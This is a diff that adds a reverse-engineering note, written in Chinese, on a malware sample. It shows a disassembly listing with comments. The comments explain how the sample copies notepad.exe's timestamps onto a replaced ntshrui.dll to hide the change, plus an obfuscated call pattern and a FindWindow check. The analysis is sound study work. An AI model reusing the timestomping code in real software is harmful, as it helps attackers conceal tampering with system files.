@@ -1,0 +1,177 @@
+
+```asm
+00404A70   .^ E9 21F9FFFF   JMP gay80.00404396
+00404396   > /60            PUSHAD
+00404397   . |8B7424 24     MOV ESI,DWORD PTR SS:[ESP+24]
+0040439B   . |C8 040100     ENTER 104,0
+0040439F   . |89E7          MOV EDI,ESP
+004043A1   . |68 04010000   PUSH 104
+004043A6   . |57            PUSH EDI
+004043A7   . |68 C3434000   PUSH gay80.004043C3                               ;  ASCII "%windir%\notepad.exe"
+004043AC   . |50            PUSH EAX
+004043AD   . |B8 AE434000   MOV EAX,gay80.004043AE
+004043B2   . |0FB7C0        MOVZX EAX,AX
+004043B5   . |C1E8 04       SHR EAX,4
+004043B8   . |83E8 02       SUB EAX,2
+004043BB   . |8B0424        MOV EAX,DWORD PTR SS:[ESP]
+004043BE   . |83C4 04       ADD ESP,4
+004043C1   . |EB 15         JMP SHORT gay80.004043D8.//call下面
+004043C3   . |25 77 69 6E 6>ASCII "%windir%\notepad"
+004043D3   . |2E 65 78 65 0>ASCII ".exe",0
+004043D8   > |68 F8434000   PUSH gay80.004043F8
+004043DD   . |50            PUSH EAX
+004043DE   . |B8 DF434000   MOV EAX,gay80.004043DF
+004043E3   . |0FB7C0        MOVZX EAX,AX
+004043E6   . |C1E8 04       SHR EAX,4
+004043E9   . |83E8 02       SUB EAX,2
+004043EC   . |8B0424        MOV EAX,DWORD PTR SS:[ESP]
+004043EF   . |83C4 04       ADD ESP,4
+004043F2   .-|FF25 E8504000 JMP DWORD PTR DS:[<&KERNEL32.ExpandEnvironmentStr>;  kernel32.ExpandEnvironmentStringsA
+//将0006FC7C   004043C3  |SrcString = "%windir%\notepad.exe"
+设置为环境变量
+004043F8   . |29D2          SUB EDX,EDX
+004043FA   . |52            PUSH EDX
+004043FB   . |52            PUSH EDX
+004043FC   . |6A 03         PUSH 3
+004043FE   . |52            PUSH EDX
+004043FF   . |6A 01         PUSH 1
+00404401   . |68 00000080   PUSH 80000000
+00404406   . |57            PUSH EDI
+00404407   . |68 27444000   PUSH gay80.00404427
+0040440C   . |50            PUSH EAX
+0040440D   . |B8 0E444000   MOV EAX,gay80.0040440E
+00404412   . |0FB7C0        MOVZX EAX,AX
+00404415   . |C1E8 04       SHR EAX,4
+00404418   . |83E8 02       SUB EAX,2
+0040441B   . |8B0424        MOV EAX,DWORD PTR SS:[ESP]
+0040441E   . |83C4 04       ADD ESP,4                                         ;  notpe.exe
+00404421   .-|FF25 D8504000 JMP DWORD PTR DS:[<&KERNEL32.CreateFileA>]        ;  kernel32.CreateFileA
+、、打开C:\\WINDOWS\\NOTEPA.exe
+00404427   . |83F8 FF       CMP EAX,-1
+0040442A   . |0F84 D2000000 JE gay80.00404502
+00404430   . |93            XCHG EAX,EBX
+00404431   . |8D57 18       LEA EDX,DWORD PTR DS:[EDI+18]
+00404434   . |52            PUSH EDX
+00404435   . |8D57 10       LEA EDX,DWORD PTR DS:[EDI+10]
+00404438   . |52            PUSH EDX
+00404439   . |8D57 08       LEA EDX,DWORD PTR DS:[EDI+8]
+0040443D   . |53            PUSH EBX
+0040443E   . |68 5E444000   PUSH gay80.0040445E
+00404443   . |50            PUSH EAX
+00404444   . |B8 45444000   MOV EAX,gay80.00404445
+00404449   . |0FB7C0        MOVZX EAX,AX
+0040444C   . |C1E8 04       SHR EAX,4
+0040444F   . |83E8 02       SUB EAX,2
+00404452   . |8B0424        MOV EAX,DWORD PTR SS:[ESP]
+00404455   . |83C4 04       ADD ESP,4
+00404458   .-|FF25 F0504000 JMP DWORD PTR DS:[<&KERNEL32.GetFileTime>]        ;  kernel32.GetFileTime
+//得到这个notepa.exe的创建时间什么的
+0040445E   . |53            PUSH EBX
+0040445F   . |68 7F444000   PUSH gay80.0040447F
+00404464   . |50            PUSH EAX
+00404465   . |B8 66444000   MOV EAX,gay80.00404466
+0040446A   . |0FB7C0        MOVZX EAX,AX
+0040446D   . |C1E8 04       SHR EAX,4
+00404470   . |83E8 02       SUB EAX,2
+00404473   . |8B0424        MOV EAX,DWORD PTR SS:[ESP]
+00404476   . |83C4 04       ADD ESP,4
+00404479   .-|FF25 D4504000 JMP DWORD PTR DS:[<&KERNEL32.CloseHandle>]        ;  kernel32.CloseHandle
+0040447F   . |29D2          SUB EDX,EDX
+00404481   . |52            PUSH EDX
+00404482   . |52            PUSH EDX
+00404483   . |6A 03         PUSH 3//OPEN\_EXISTING
+00404485   . |52            PUSH EDX
+00404486   . |6A 01         PUSH 1
+00404488   . |68 000000C0   PUSH C0000000
+0040448D   . |56            PUSH ESI
+0040448E   . |68 AE444000   PUSH gay80.004044AE
+00404493   . |50            PUSH EAX
+00404494   . |B8 95444000   MOV EAX,gay80.00404495
+00404499   . |0FB7C0        MOVZX EAX,AX
+0040449C   . |C1E8 04       SHR EAX,4
+0040449F   . |83E8 02       SUB EAX,2
+004044A2   . |8B0424        MOV EAX,DWORD PTR SS:[ESP]
+004044A5   . |83C4 04       ADD ESP,4
+004044A8   .-|FF25 D8504000 JMP DWORD PTR DS:[<&KERNEL32.CreateFileA>]        ;  kernel32.CreateFileA
+//这里打开C:\\WINDOWS\\ntshrui.dll看参数，是打开，不是创建
+004044AE   . |83F8 FF       CMP EAX,-1
+004044B1   . |74 4F         JE SHORT gay80.00404502
+004044B3   . |93            XCHG EAX,EBX
+004044B4   . |8D57 18       LEA EDX,DWORD PTR DS:[EDI+18]
+004044B7   . |52            PUSH EDX
+004044B8   . |8D57 10       LEA EDX,DWORD PTR DS:[EDI+10]
+004044BB   . |52            PUSH EDX
+004044BC   . |8D57 08       LEA EDX,DWORD PTR DS:[EDI+8]
+004044BF   . |52            PUSH EDX
+004044C0   . |53            PUSH EBX
+004044C1   . |68 E1444000   PUSH gay80.004044E1
+004044C6   . |50            PUSH EAX
+004044C7   . |B8 C8444000   MOV EAX,gay80.004044C8
+004044CC   . |0FB7C0        MOVZX EAX,AX
+004044CF   . |C1E8 04       SHR EAX,4
+004044D2   . |83E8 02       SUB EAX,2
+004044D5   . |8B0424        MOV EAX,DWORD PTR SS:[ESP]
+004044D8   . |83C4 04       ADD ESP,4
+004044DB   .-|FF25 18514000 JMP DWORD PTR DS:[<&KERNEL32.SetFileTime>]        ;  kernel32.SetFileTime
+//将notepa的创建时间等时间设置到这个dll上面，让人发觉不了
+004044E1   . |53            PUSH EBX
+004044E2   . |68 02454000   PUSH gay80.00404502
+004044E7   . |50            PUSH EAX
+004044E8   . |B8 E9444000   MOV EAX,gay80.004044E9
+004044ED   . |0FB7C0        MOVZX EAX,AX
+004044F0   . |C1E8 04       SHR EAX,4
+004044F3   . |83E8 02       SUB EAX,2
+004044F6   . |8B0424        MOV EAX,DWORD PTR SS:[ESP]
+004044F9   . |83C4 04       ADD ESP,4
+004044FC   .-|FF25 D4504000 JMP DWORD PTR DS:[<&KERNEL32.CloseHandle>]        ;  kernel32.CloseHandle
+.//关句柄
+00404502   > |C9            LEAVE
+00404503   . |61            POPAD
+//接着来看。。。
+00404A75   .  68 944A4000   PUSH gay80.00404A94
+00404A7A   .  50            PUSH EAX
+00404A7B   .  B8 7C4A4000   MOV EAX,gay80.00404A7C
+00404A80   .  0FB7C0        MOVZX EAX,AX
+00404A83   .  C1E8 04       SHR EAX,4
+00404A86   .  83E8 02       SUB EAX,2
+00404A89   .  8B0424        MOV EAX,DWORD PTR SS:[ESP]
+00404A8C   .  83C4 04       ADD ESP,4
+00404A8F   .  E9 DE020000   JMP gay80.00404D72//这里上面看过了，就是调用findwindows查找\_CLS\_SessionAgent
+//接下来是一段没有反汇编出来的，查机器码得到的
+00404A94      85            DB 85
+00404A95      C0            DB C0
+00404A96      75            DB 75                                             ;  CHAR 'u'
+00404A97      1F            DB 1F //jnz 404a97+1f+1=404AB7
+00404A98      68            DB 68   //PUSH   00404AB7                                       ;  CHAR 'h'
+00404A99      B74A4000      DD gay80.00404AB7
+00404A9D      50            DB 50                //PUSH EAX                              ;  CHAR 'P'
+00404A9E      B8            DB B8
+00404A9F      9F4A4000      DD gay80.00404A9F
+00404AA3      0F            DB 0F
+00404AA4      B7            DB B7
+00404AA5      C0            DB C0 //MOVZX EAX,AX
+00404AA6      C1            DB C1
+00404AA7      E8            DB E8
+00404AA8      04            DB 04 //shr eax,4
+00404AA9      83            DB 83 //
+00404AAA      E8            DB E8 //
+00404AAB      02            DB 02 //SUB EAX,2
+00404AAC      8B            DB 8B
+00404AAD      04            DB 04
+00404AAE      24            DB 24    //MOV EAX,DWORD PTR SS:[ESP]                                         ;  CHAR '$'
+00404AAF      83            DB 83
+00404AB0      C4            DB C4        //ADD ESP,4
+00404AB1   .  04 E9         ADD AL,0E9
+00404AB3   .  9B            WAIT
+00404AB4   .  F7FF          IDIV EDI
+00404AB6   .  FFC9          DEC ECX //JMP gay80.00404252
+```
+
+整理下
+
+【
+
+```asm
+00404A94      85            DB 85
+00404A95      C0            DB C0
+```
